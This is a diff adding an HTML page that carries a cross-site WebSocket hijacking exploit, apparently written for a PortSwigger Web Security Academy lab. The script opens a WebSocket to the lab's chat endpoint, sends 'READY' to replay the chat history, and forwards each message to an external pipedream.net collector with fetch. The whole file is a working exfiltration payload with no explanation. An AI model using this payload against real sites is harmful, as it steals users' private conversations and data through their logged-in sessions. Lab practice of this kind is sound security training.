@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<body>
+    <script>
+        const ws = new WebSocket('wss://0a6b00d404aa3360835e0f0e00f100ee.web-security-academy.net/chat');
+        ws.onopen = function() {
+            console.log("open");
+            ws.send("READY");
+        };
+        ws.onmessage = function(event) {
+            console.log(event.data)
+            fetch("https://eo7sqhudycn8l8k.m.pipedream.net", {method: "POST", body: event.data})
+        };
+    </script>
+</body>
+</html>
